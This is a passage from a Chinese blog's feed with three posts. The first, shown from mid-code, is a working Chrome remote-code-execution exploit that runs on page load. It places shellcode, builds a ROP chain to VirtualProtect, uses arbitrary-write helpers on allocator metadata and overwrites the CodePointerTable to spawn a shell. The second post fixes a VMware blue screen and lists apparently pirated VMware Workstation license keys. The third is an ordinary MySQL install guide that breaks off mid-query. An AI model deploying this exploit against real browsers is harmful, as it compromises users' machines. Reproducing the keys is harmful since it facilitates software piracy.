dv.getBigUint64(0x1000 + i, true).toString(16));    &#125;*/</span>        <span class="token comment">// shellcode: [0x14000, 0x16000)</span>        <span class="token comment">// ropchain: 0x1e000</span>        <span class="token comment">// lpflOldProtect: 0x1eff0</span>        <span class="token comment">// vtable: [0x1f000, 0x20000)</span>        <span class="token comment">// scratchpad for fake bucket: [0x20000, +sizeof(bucket))</span>        <span class="token comment">// scratchpad for opt: [0x21000, ...)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sc<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          dv<span class="token punctuation">.</span><span class="token function">setUint8</span><span class="token punctuation">(</span><span class="token number">0x14000</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> sc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// VirtualProtect(base+0x10000, 0xf0000, PAGE_EXECUTE_READ, lpflOldProtect)</span>        <span class="token keyword">function</span> <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token parameter">ofs<span class="token punctuation">,</span> val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1e000</span> <span class="token operator">+</span> ofs<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> pop_gadget<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span> ab_partition_base <span class="token operator">+</span> <span class="token number">0x14000n</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rcx</span>        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x2000n</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rdx</span>        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x20n</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// r8 = PAGE_EXECUTE_READ</span>        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> ab_partition_base <span class="token operator">+</span> <span class="token number">0x1eff0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// r9 = lpflOldProtect</span>        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// r10</span>        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> prax_ret<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> virtualprotect_iat_ofs<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rax = &amp;kernel32.VirtualProtect</span>        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> jmp_drax<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// jmp qword ptr [rax]</span>        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> ab_partition_base <span class="token operator">+</span> <span class="token number">0x14000n</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// shellcode</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span>            <span class="token number">0x1f000</span> <span class="token operator">+</span> i<span class="token punctuation">,</span>            <span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> vtable_gadget<span class="token punctuation">)</span> <span class="token operator">^</span> fptr_xor<span class="token punctuation">,</span>            <span class="token boolean">true</span>          <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//dv.setBigUint64(0x1f000 + i, 0xdeadbeefcafe0000n + BigInt(i / 0x10), true);</span>        <span class="token punctuation">&#125;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] shellcode / ropchain / vtable init complete"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// helper function to recursively zero out a memory region via primitive #1 (two top zero bytes), with collateral damage to [base-6, base) and [base+0x17, base+len+0x1f)</span>        <span class="token comment">// ! WARNING ! caller must assert PA_CHECK(bucket->num_full_slot_spans) for all strides (descending from len - 2 by stride 2)</span>        <span class="token comment">// use only for small len (under 0x16) as it will eventually overwrite itself</span>        <span class="token keyword">function</span> <span class="token function">zero_out</span><span class="token punctuation">(</span><span class="token parameter">base<span class="token punctuation">,</span> len<span class="token punctuation">,</span> stride <span class="token operator">=</span> <span class="token number">2</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> ofs <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span> ofs <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> ofs <span class="token operator">-=</span> stride<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1090</span><span class="token punctuation">,</span> base <span class="token operator">+</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>ofs<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">6n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1098</span><span class="token punctuation">,</span> dv<span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1098</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// meta->marked_full = 1</span>            abs<span class="token punctuation">[</span>absctr<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// helper function for arbitrary addr &amp; value write</span>        <span class="token comment">// caller must assert nullity of [target-8], [target], [target+0x10]</span>        <span class="token keyword">function</span> <span class="token function">arb_write</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token comment">// save current freelist_head</span>          <span class="token keyword">const</span> freelist_head_orig <span class="token operator">=</span> dv<span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1080</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1080</span><span class="token punctuation">,</span> ab_partition_base <span class="token operator">+</span> <span class="token number">0x10000n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// meta->freelist_head = non-null</span>          <span class="token keyword">const</span> new_bitfield <span class="token operator">=</span>            <span class="token punctuation">(</span>dv<span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1098</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1n</span> <span class="token operator">&lt;&lt;</span> <span class="token number">14n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">2n</span><span class="token punctuation">;</span>          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1088</span><span class="token punctuation">,</span> target <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// meta->next_slot_span = target - 8</span>          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1090</span><span class="token punctuation">,</span> ab_partition_base <span class="token operator">+</span> <span class="token number">0x20000n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// meta->bucket = bucket</span>          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1098</span><span class="token punctuation">,</span> new_bitfield<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// meta->marked_full = 0, meta->num_allocated_slots = 1</span>          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x20000</span><span class="token punctuation">,</span> ab_partition_base <span class="token operator">+</span> <span class="token number">0x1080n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bucket->active_slot_spans_head = meta</span>          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x20000</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bucket->decomitted_slot_spans_head = value</span>          dv<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">0x20000</span> <span class="token operator">+</span> <span class="token number">0x1c</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bucket->num_system_pages_per_slot_span = 1 (avoid PartitionDirectUnmap())</span>          abs<span class="token punctuation">[</span>absctr<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span>            <span class="token number">0x1098</span><span class="token punctuation">,</span>            <span class="token punctuation">(</span>dv<span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1098</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1n</span> <span class="token operator">&lt;&lt;</span> <span class="token number">14n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span>              <span class="token punctuation">(</span><span class="token number">0x300n</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token boolean">true</span>          <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// meta->marked_full = 0, meta->num_allocated_slots = 0x300</span>          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1080</span><span class="token punctuation">,</span> freelist_head_orig<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// meta->freelist_head = original</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// DEBUG: pre-opt zero_out() &amp; arb_write()</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] DEBUG: pre-opt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x21018</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1n</span> <span class="token operator">&lt;&lt;</span> <span class="token number">64n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">zero_out</span><span class="token punctuation">(</span>ab_partition_base <span class="token operator">+</span> <span class="token number">0x21000n</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x21000</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x21008</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x21018</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">arb_write</span><span class="token punctuation">(</span>ab_partition_base <span class="token operator">+</span> <span class="token number">0x21008n</span><span class="token punctuation">,</span> <span class="token number">0xdeadbeefcafebaben</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x21008</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> trigger <span class="token operator">=</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] sleeping 1000ms..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// set ropchain addr (ab_partition_base + 0x1e000n)</span>        <span class="token comment">// all zeros, use sbx primitive #2</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] target write prepare (ropchain addr)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">arb_write</span><span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> vtable_rax<span class="token punctuation">,</span> ab_partition_base <span class="token operator">+</span> <span class="token number">0x1e000n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] target write success (ropchain addr)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// set vtable pivot gadget</span>        <span class="token comment">// surrounded with pointers into chrome.dll, use #1 + #2</span>        <span class="token comment">// ordering is super important!!</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] target write prepare (pivot gadget)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">zero_out</span><span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> vtable_call_base<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [0, 6)       / [-6, 0), [0x17, 0x25)</span>        <span class="token function">zero_out</span><span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> vtable_call_base <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [-8, 0)      / [...), [0x11, 0x1f)</span>        <span class="token function">zero_out</span><span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> vtable_call_base <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [0x10, 0x18) / [8, 0x10), [...)</span>        <span class="token function">arb_write</span><span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> vtable_call_base<span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> pivot_gadget<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] target write success (pivot gadget)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// overwrite CodePointerTable</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] target write (CPT)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] expect shell after 500ms!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">zero_out</span><span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> base_tgt_ofs <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">,</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// pulls down from Sandbox base, stride=1 just in case</span>        <span class="token comment">// pulls down from Sandbox size, stride=1 just in case</span>        <span class="token comment">// lower 2byte 0, upper 2byte non-zero to prevent some weird resetting logic (zeros actually come from bytes index 2~3 from SlotSpanMetadata instead of the top two 6~7)</span>        <span class="token function">zero_out</span><span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> base_tgt_ofs <span class="token operator">+</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x4n</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">arb_write</span><span class="token punctuation">(</span>          chrome_base <span class="token operator">+</span> base_tgt_ofs<span class="token punctuation">,</span>          ab_partition_base <span class="token operator">+</span> <span class="token number">0x1f000n</span> <span class="token operator">-</span> <span class="token number">0x10000n</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// fake CPT, i.e. "vtable" (vtable starts at 0x1f000, offset 0x103d0 -> translate to 0x1f3d0)</span>        <span class="token comment">//console.log('[*] target write success (CPT)');</span>        <span class="token comment">// trigger through CPT call (await isn't strictly needed, it triggers itself on timeout)</span>        <span class="token keyword">await</span> trigger<span class="token punctuation">;</span>        <span class="token comment">// DEBUG: crash</span>        <span class="token comment">//caged_write(0xfffffff0, 0xdeadc0d3);</span>      <span class="token punctuation">&#125;</span>      window<span class="token punctuation">.</span>onload <span class="token operator">=</span> exp<span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- poc.html --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>wasm-module-builder.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>poc.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>From: <a href="https://ssd-disclosure.com/ssd-advisory-google-chrome-rce/">https://ssd-disclosure.com/ssd-advisory-google-chrome-rce/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> EXP </tag>
            
            <tag> Chrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware安装Win10后一直蓝屏重启，终止代码UNSUPPORTED PROCESSOR</title>
      <link href="/2024/08/27/vmware-an-zhuang-win10-hou-yi-zhi-lan-ping-chong-qi-zhong-zhi-dai-ma-unsupported-processor/"/>
      <url>/2024/08/27/vmware-an-zhuang-win10-hou-yi-zhi-lan-ping-chong-qi-zhong-zhi-dai-ma-unsupported-processor/</url>
      
        <content type="html"><![CDATA[<p>VMware客户机操作系统的安装会中止，并出现绿屏（或蓝屏）和错误消息 UNSUPPORTED_PROCESSOR。原因似乎是 Microsoft 对 Hyper-V 进行了修改。</p><span id="more"></span><p>#无语了折腾了半天,最简单办法Vmware升到v17.x就行了<br>附点网上看的秘钥<br>VMware Workstation v17.x 永久许可证激活密钥：<br>MC60H-DWHD5-H80U9-6V85M-8280D<br>4A4RR-813DK-M81A9-4U35H-06KND<br>NZ4RR-FTK5H-H81C1-Q30QH-1V2LA<br>JU090-6039P-08409-8J0QH-2YR7F<br>4Y09U-AJK97-089Z0-A3054-83KLA</p><p><img src="/images/2024/08/27/dfa9cfa3-cfe7-4667-b0c3-2ec653c0782a.png"><br>影响的可能是 Windows 11 25179 或 25182 或 Windows Server 2022 20348.946。原因似乎是 Microsoft 针对 Hyper-V 的修改与 VMware 发生冲突。Windows 安全模式似乎不会触发此停止代码。</p><h3 id="所以最好的解决方法就是———换个新镜像"><a href="#所以最好的解决方法就是———换个新镜像" class="headerlink" title="所以最好的解决方法就是———换个新镜像"></a>所以最好的解决方法就是———<strong>换个新镜像</strong></h3><p><a href="https://www.microsoft.com/zh-cn/software-download/windows10">Win10iso下载链接</a></p><h3 id="不想下载新镜像也不是没办法"><a href="#不想下载新镜像也不是没办法" class="headerlink" title="不想下载新镜像也不是没办法"></a>不想下载新镜像也不是没办法</h3><p>为了能够在 VMware Workstation 下的虚拟机中安装 Windows作为客户机操作系统，必须在第一次重启后终止虚拟机。<br>什么意思呢？就是蓝屏后关机。<br><img src="/images/2024/08/27/579e49e5-832a-4cf4-bf38-3a7e69d2e6aa.png"><br>然后在 CPU 下的客户机操作系统选项中，处理器数量和每个处理器的核心数量，必须将值设置为 1。<br><img src="/images/2024/08/27/c9643ba6-5013-4a16-b622-b42a385df7e6.png"><br>然后开机就行了。</p>]]></content>
      
      
      <categories>
          
          <category> 运维笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> VMware </tag>
            
            <tag> Windows10 </tag>
            
            <tag> BUG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7离线安装MySQL</title>
      <link href="/2024/08/23/centos7-chi-xian-an-zhuang-mysql/"/>
      <url>/2024/08/23/centos7-chi-xian-an-zhuang-mysql/</url>
      
        <content type="html"><![CDATA[<p>记录一下CentOS7离线安装MySQL过程</p><span id="more"></span><h2 id="一、下载MySQL"><a href="#一、下载MySQL" class="headerlink" title="一、下载MySQL"></a>一、下载MySQL</h2><p>选择对应系统的合适的版本下载<br><a href="https://downloads.mysql.com/archives/community/">下载地址</a><br><img src="/images/2024/08/23/82209d43-eb35-452c-bd0c-0596e77fc756.png"></p><h2 id="二、上传安装包并解压"><a href="#二、上传安装包并解压" class="headerlink" title="二、上传安装包并解压"></a>二、上传安装包并解压</h2><p>将tar包上传到MySQL官网推荐位置<code>/usr/local/mysql</code>（也可是任意位置）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /usr/local/mysql</code></pre><p>解压<code>mysql-5.7.37-1.el7.x86_64.rpm-bundle.tar</code>包</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-xf</span> mysql-5.7.37-1.el7.x86_64.rpm-bundle.tar</code></pre><p><img src="/images/2024/08/23/134f0575-750f-40c5-b32c-afab6aae9ab7.png"></p><h2 id="三、安装"><a href="#三、安装" class="headerlink" title="三、安装"></a>三、安装</h2><p>因为是离线环境，<strong>建议</strong>在使用<code>yum</code>命令前先用以下命令清除本地<code>mirrorlist</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">yum clean expire-cache</code></pre><p>执行安装（<code>&#123;server,client,common,libs&#125;</code> 为必备，上文截图解压出的安装包并不需要全部安装）</p><pre class="language-bash" data-language="bash"><code class="language-bash">yum localinstall <span class="token parameter variable">-y</span> <span class="token function">install</span> mysql-community-<span class="token punctuation">&#123;</span>server,client,common,libs<span class="token punctuation">&#125;</span>-*</code></pre><p>查看是否安装成功</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">rpm</span> <span class="token parameter variable">-qa</span> <span class="token operator">|</span> <span class="token function">grep</span> mysql</code></pre><p><img src="/images/2024/08/23/ccd9d374-34bc-4f6e-882a-70fa31a6dc14.png"></p><h2 id="四、启动MySQL"><a href="#四、启动MySQL" class="headerlink" title="四、启动MySQL"></a>四、启动MySQL</h2><p>启动mysql</p><pre class="language-bash" data-language="bash"><code class="language-bash">systemctl start mysqld</code></pre><p>查看mysql临时密码</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token string">'temporary password'</span> /var/log/mysqld.log</code></pre><p><img src="/images/2024/08/23/3a31ddb3-75c8-4d0e-8678-6aadb76c4fd6.png"><br>使用临时密码登录mysql</p><pre class="language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-uroot</span> -p你的密码</code></pre><p>这里由于生成的临时密码恰好有个<code>)</code>，在bash中会被识别为格式错误，所以使用</p><pre class="language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-p</span></code></pre><p>然后再输入密码登陆就好<br><img src="/images/2024/08/23/872e0a83-5335-465b-a005-6ab1fe3591fa.png"></p><h2 id="五、初始化MySQL"><a href="#五、初始化MySQL" class="headerlink" title="五、初始化MySQL"></a>五、初始化MySQL</h2><h4 id="1-修改登录密码"><a href="#1-修改登录密码" class="headerlink" title="1.修改登录密码"></a>1.修改登录密码</h4><p><strong>[不建议]</strong> 想要把密码设置简单一点需要调整密码校验强度（low&#x3D;最低）</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">set global validate_password_policy&#x3D;LOW;</code></pre><p><strong>[不建议]</strong> 修改密码长度限制（任意长度）</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">set global validate_password_length&#x3D;4;</code></pre><p>正式修改密码</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;新密码&#39;;</code></pre><h4 id="2-允许远程访问"><a href="#2-允许远程访问" class="headerlink" title="2.允许远程访问"></a>2.允许远程访问</h4><p><strong>[不建议]</strong> 修改<code>root</code>访问权限，设置允许远程访问<br>切换到<code>mysql</code>数据</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">use mysql;</code></pre><p>查看用户表<code>user</code></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select Host,User from 